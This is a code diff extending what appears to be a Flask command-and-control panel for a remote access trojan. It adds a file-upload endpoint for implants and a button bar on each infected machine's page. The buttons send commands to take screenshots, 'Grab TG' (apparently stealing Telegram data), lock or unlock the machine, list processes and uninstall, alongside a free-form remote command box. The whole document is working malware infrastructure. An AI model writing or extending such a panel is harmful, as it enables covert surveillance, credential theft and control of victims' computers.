@@ -3,14 +3,17 @@
 # env:  PANEL_TOKEN, PANEL_USER, PANEL_PASS, PORT (опц.)
 # run:  gunicorn -b 0.0.0.0:$PORT panel:app
 
-import os, sqlite3, time, secrets
-from flask import Flask, request, g, Response, redirect, render_template_string
+import os, sqlite3, time, secrets, uuid
+from flask import Flask, request, g, Response, redirect, render_template_string, send_from_directory
 
 API_TOKEN  = os.environ.get("PANEL_TOKEN", "change-me")
 ADMIN_USER = os.environ.get("PANEL_USER", "admin")
 ADMIN_PASS = os.environ.get("PANEL_PASS", "change-me")
 DB_PATH    = os.environ.get("PANEL_DB", "panel.db")
 ONLINE_SEC = 90
+UPLOAD_DIR = "uploads"
+
+os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 app = Flask(__name__)
 
@@ -95,6 +98,26 @@ def result():
                   (d.get("result", ""), d["id"]))
     return {"ok": True}
 
+@app.post("/api/upload")
+def upload():
+    if not auth_ok():
+        return ("", 401)
+    if 'file' not in request.files:
+        return {"error": "no file"}, 400
+    f = request.files['file']
+    if f.filename == '':
+        return {"error": "no filename"}, 400
+    filename = f"{uuid.uuid4().hex}_{os.path.basename(f.filename)}"
+    filepath = os.path.join(UPLOAD_DIR, filename)
+    f.save(filepath)
+    return {"url": f"/files/{filename}"}
+
+@app.get("/files/<filename>")
+def files(filename):
+    if not admin_ok():
+        return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="p"'})
+    return send_from_directory(UPLOAD_DIR, filename)
+
 LIST_TPL = """<!doctype html><meta charset=utf-8><title>panel</title>
 <style>body{font:14px monospace;background:#111;color:#ddd;padding:1rem}a{color:#7cf}
 tr.on td{color:#7f7}tr.off td{color:#777}table{border-collapse:collapse;width:100%}
@@ -108,13 +131,35 @@ DETAIL_TPL = """<!doctype html><meta charset=utf-8><title>{{ v.hostname }}</titl
 <style>body{font:14px monospace;background:#111;color:#ddd;padding:1rem}a{color:#7cf}
 pre{background:#000;padding:.6rem;white-space:pre-wrap;border:1px solid #333}
 input[type=text]{width:60%;background:#000;color:#eee;border:1px solid #555;padding:.3rem}
-button{background:#252;color:#fff;border:0;padding:.35rem .8rem}</style>
+button{background:#252;color:#fff;border:0;padding:.35rem .8rem;cursor:pointer;border-radius:4px}
+button:hover{background:#363}
+.btn-red{background:#611}
+.btn-green{background:#161}
+.btn-bar{display:flex; flex-wrap:wrap; gap:0.5rem; margin:1rem 0}
+</style>
 <p><a href="/">← back</a></p><h2>{{ v.hostname }} / {{ v.username }}</h2>
 <p>id: {{ v.id }}<br>ip: {{ v.ip }}<br>os: {{ v.os_info }}<br>last: {{ v.ago }}</p>
+
 <form method=post action="/send"><input type=hidden name=id value="{{ v.id }}">
 <input type=text name=cmd placeholder="cmd /c whoami" required><button>send</button></form>
+
+<div class="btn-bar">
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/ping"><button>Ping</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/screenshot"><button>📸 Screenshot</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/grab"><button>📦 Grab TG</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/lock"><button class="btn-red">🔒 Lock</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/unlock"><button class="btn-green">🔓 Unlock</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/ps"><button>Processes</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/ip"><button>IPConfig</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/whoami"><button>Whoami</button></form>
+<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/uninstall"><button class="btn-red">Uninstall</button></form>
+</div>
+
 <h3>commands</h3>{% for c in cs %}<pre>[{{ c.id }}] {{ c.cmd }}
-{{ '[pending]' if not c.finished else c.result }}</pre>{% endfor %}
+{% if not c.finished %}[pending]
+{% else %}{% if c.result.startswith('data:image/jpeg;base64,') %}
+<img src="{{ c.result }}" style="max-width:100%; border:1px solid #333;">
+{% else %}{{ c.result }}{% endif %}{% endif %}</pre>{% endfor %}
 <meta http-equiv=refresh content=5>"""
 
 def ago(ts):
